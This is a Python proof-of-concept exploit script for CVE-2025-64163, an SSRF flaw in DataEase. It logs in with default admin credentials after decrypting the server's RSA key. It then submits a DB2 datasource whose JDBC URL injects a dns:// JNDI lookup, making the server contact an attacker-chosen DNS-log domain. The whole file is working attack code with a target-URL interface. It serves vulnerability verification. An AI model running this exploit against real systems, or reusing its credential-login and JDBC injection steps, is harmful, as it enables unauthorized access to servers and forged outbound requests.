#!/usr/bin/env python3
import requests
import json
import sys
import argparse
import base64
import random
import string

try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5, AES
except ImportError:
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Cipher import PKCS1_v1_5, AES

class DataEaseSSRF:
    IV_KEY = b"0000000000000000"
    PK_SEPARATOR = "-pk_separator-"
    
    def __init__(self, target, dns_domain):
        self.target = target.rstrip('/')
        self.dns_domain = dns_domain
        self.session = requests.Session()
        self.token = None
    
    def aes_decrypt(self, encrypted_data, key):
        cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC, self.IV_KEY)
        decrypted = cipher.decrypt(base64.b64decode(encrypted_data))
        padding_len = decrypted[-1]
        return decrypted[:-padding_len].decode('utf-8')
    
    def get_public_key(self):
        url = f"{self.target}/de2api/dekey"
        resp = self.session.get(url, timeout=30)
        if resp.status_code == 200:
            result = resp.json()
            if result.get("code") == 0:
                data = result.get("data")
                separator = base64.urlsafe_b64encode(self.PK_SEPARATOR.encode()).decode()
                parts = data.split(separator)
                if len(parts) == 2:
                    encrypted_pk, aes_key = parts
                    return self.aes_decrypt(encrypted_pk, aes_key)
        return None
    
    def rsa_encrypt(self, text, public_key_str):
        key_data = base64.b64decode(public_key_str)
        public_key = RSA.import_key(key_data)
        cipher = PKCS1_v1_5.new(public_key)
        encrypted = cipher.encrypt(text.encode('utf-8'))
        return base64.b64encode(encrypted).decode('utf-8')
        
    def login(self, username="admin", password="DataEase@123456"):
        public_key = self.get_public_key()
        if not public_key:
            print("[-] Failed to get public key")
            return False
        
        encrypted_name = self.rsa_encrypt(username, public_key)
        encrypted_pwd = self.rsa_encrypt(password, public_key)
        
        url = f"{self.target}/de2api/login/localLogin"
        data = {"name": encrypted_name, "pwd": encrypted_pwd}
        resp = self.session.post(url, json=data, timeout=30)
        if resp.status_code == 200:
            result = resp.json()
            if result.get("code") == 0:
                self.token = result.get("data", {}).get("token")
                print(f"[+] Login successful, token obtained")
                return True
        print(f"[-] Login failed: {resp.text}")
        return False
    
    def trigger_ssrf(self):
        if not self.token:
            print("[-] No token available")
            return False
        
        url = f"{self.target}/de2api/datasource/validate"
        headers = {
            "X-DE-TOKEN": self.token,
            "Content-Type": "application/json"
        }
        
        jdbc_url = f"jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=dns://{self.dns_domain}:1099/poc;"
        
        configuration = {
            "type": "db2",
            "host": "127.0.0.1", 
            "port": 50000,
            "dataBase": "BLUDB",
            "schema": "",
            "username": "test",
            "password": "test",
            "customDriver": "default",
            "urlType": "jdbcUrl",
            "jdbcUrl": jdbc_url,
            "extraParams": ""
        }
        
        config_b64 = base64.b64encode(json.dumps(configuration).encode()).decode()
        
        payload = {
            "name": "test_db2_ssrf",
            "type": "db2",
            "configuration": config_b64
        }
        
        print(f"[*] DNS domain: {self.dns_domain}")
        print(f"[*] JDBC URL: {jdbc_url}")
        
        resp = self.session.post(url, json=payload, headers=headers, timeout=60)
        print(f"[*] Response status: {resp.status_code}")
        return True

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-64163 DataEase DB2 SSRF PoC')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-d', '--dns', required=True, help='DNS log base domain')
    parser.add_argument('-u', '--username', default='admin')
    parser.add_argument('-p', '--password', default='DataEase@123456')
    args = parser.parse_args()
    
    unique_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    dns_domain = f"{unique_id}.{args.dns}"
    
    print("=" * 60)
    print("CVE-2025-64163 - DataEase DB2 SSRF via dns:// Protocol")
    print("=" * 60)
    print(f"[*] Target: {args.target}")
    print(f"[*] Unique ID: {unique_id}")
    print(f"[*] DNS Domain: {dns_domain}")
    print()
    
    exploit = DataEaseSSRF(args.target, dns_domain)
    
    print("[*] Step 1: Authenticating...")
    if not exploit.login(args.username, args.password):
        sys.exit(1)
    
    print()
    print("[*] Step 2: Triggering SSRF...")
    exploit.trigger_ssrf()
    
    print()
    print(f"[*] Check DNS log for queries containing '{unique_id}'")
    print("[*] If found, the vulnerability is confirmed")

if __name__ == "__main__":
    main()
